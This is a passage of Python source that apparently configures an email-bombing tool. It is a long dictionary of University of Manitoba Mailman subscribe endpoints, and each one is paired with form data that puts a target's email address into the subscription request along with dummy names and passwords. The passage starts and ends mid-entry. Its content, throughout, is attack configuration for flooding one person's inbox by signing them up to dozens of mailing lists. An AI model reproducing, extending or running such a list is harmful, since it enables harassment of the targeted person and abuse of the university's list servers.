                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/fkrm-graduate-students',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'lcenH': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/fos-makerspace',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/fos-makerspace',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'JjKgU': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/fos-makerspace-announce',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/fos-makerspace-announce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'TPRWz': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/fos-makerspace-discussion',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/fos-makerspace-discussion',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'kRaJx': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/fourth-year-nswp-students',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/fourth-year-nswp-students',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'vGZmA': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/fs-all',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/fs-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'pThAD': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/fs-payroll-all',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/fs-payroll-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'oNDoy': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/fss-ihp-undergrad-all',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/fss-ihp-undergrad-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'VRTTx': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/geoscience-academics',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/geoscience-academics',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'pKQSo': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/geoscience-adjunct',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/geoscience-adjunct',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'wgwCT': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/geoscience-all',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/geoscience-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'oUulr': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/geoscience-associates',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/geoscience-associates',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ZOJda': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/geoscience-emeritus',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/geoscience-emeritus',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'bvvOw': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/geoscience-geofriends',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/geoscience-geofriends',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'wjKYT': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/geoscience-grads',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/geoscience-grads',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'FasCk': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/geoscience-sessionals',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/geoscience-sessionals',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'wymrj': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/geoscience-supstaff',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/geoscience-supstaff',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'BpkHB': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/global-circus-studies',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/global-circus-studies',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'NccEP': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/gradstudies-faculty-council',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/gradstudies-faculty-council',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'GFVga': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/grex-logs',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/grex-logs',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'KwkLF': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/h2o-create',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/h2o-create',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'bnwoq': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/health-sciences-graduate-students',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/health-sciences-graduate-students',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'bdYhi': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/hr-research-centres',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/hr-research-centres',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'tXbTV': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/icswp-academics',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/icswp-academics',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'zRVVI': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/icswp-all',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/icswp-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ICNeA': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/icswp-supstaff',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/icswp-supstaff',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'BOPwU': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/indigenous.newsletter',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/indigenous.newsletter',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'PjepM': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/ist-alerts',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/ist-alerts',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'RUouH': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/ist-all',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/ist-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'NJGkT': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/ist-app-build-cherwell',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/ist-app-build-cherwell',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'OWKNd': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/ist-cns-integration',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/ist-cns-integration',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ZLFHy': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/ist-cns-networking',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/ist-cns-networking',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'GNmyr': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/ist-cns-storage',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/ist-cns-storage',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'bUphf': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/ist-cns-unix-team',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/ist-cns-unix-team',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'nFUjy': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/ist-cns-winserv-team',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/ist-cns-winserv-team',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'aVkEe': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/ist-cs-all',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/ist-cs-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'HdWAB': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/ist-enterprise-ac',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/ist-enterprise-ac',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'znkdz': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/ist-enterprise-ac-finance',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/ist-enterprise-ac-finance',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ljlKw': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/ist-enterprise-ac-hr',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/ist-enterprise-ac-hr',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'AoqAE': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/ist-enterprise-ac-student',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/ist-enterprise-ac-student',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'jWLxK': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/ist-enterprise-tas',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/ist-enterprise-tas',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'IFSRd': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/ist-help-and-solutions',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/ist-help-and-solutions',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'OibkJ': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/ist-mathematica',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/ist-mathematica',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'FYaUO': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/ist-mgrs',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/ist-mgrs',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'twtZT': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/ist-origin',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/ist-origin',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'GbntN': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/ist-retirees-all',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/ist-retirees-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'IJNuE': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/ist-sas',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/ist-sas',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'whIba': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/ist-spss',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/ist-spss',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'mPlNI': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/jdcwest-2008',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/jdcwest-2008',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'OATDq': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/kleysen-neuroscience',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/kleysen-neuroscience',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'hURye': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/krm-students',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/krm-students',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'qpWyg': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/law-faculty',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/law-faculty',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'IiOtV': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/law-fallpracticingprofessionals',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/law-fallpracticingprofessionals',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'aotMZ': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/law-gradstudents',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/law-gradstudents',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'eIdGr': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/law-senior-scholars',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/law-senior-scholars',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'yRLsb': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/law-staff',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/law-staff',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'YAsOj': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/law-winterpracticingprofessionals',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/law-winterpracticingprofessionals',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'VTrSq': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/lib-academics',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/lib-academics',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'yNcoC': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/lib-access',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/lib-access',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'eEHWi': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/lib-all',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/lib-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'VKrNG': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/lib-circ-supervisorsplus',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/lib-circ-supervisorsplus',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'fnMcb': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/lib-daf-all',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/lib-daf-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'MWora': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/lib-e-offers',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/lib-e-offers',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'wcJqF': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/lib-finance',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/lib-finance',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'nxcQJ': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/lib-law-all',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/lib-law-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ELEGo': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/lib-librarians-fg',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/lib-librarians-fg',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'xFYzy': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/lib-mlci-board',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/lib-mlci-board',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ZeikM': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/lib-mlci-members',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/lib-mlci-members',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'IzpGM': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/lib-pubserv',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/lib-pubserv',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'hyAUn': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/lib-scitech',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/lib-scitech',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'gcaqk': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/lib-stl-all',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/lib-stl-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'YXUYk': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/lib-virt',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/lib-virt',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'svLhz': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/lib-wrhavl',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/lib-wrhavl',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'cLjxA': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/ling-listserv',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/ling-listserv',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'CkcFw': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/march-arch',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/march-arch',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'VGCCd': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/march-cp',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/march-cp',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'glznf': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/march-id',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/march-id',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'eEPYe': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/march-la',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/march-la',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'MQYbP': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/mauro-centre-metro',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/mauro-centre-metro',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'RvyTE': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/mauro-centre-public',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/mauro-centre-public',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'RUDmM': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/mauro-centre-spc',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/mauro-centre-spc',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'oFDPK': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/mauro-centre-um',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/mauro-centre-um',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'CehIU': {
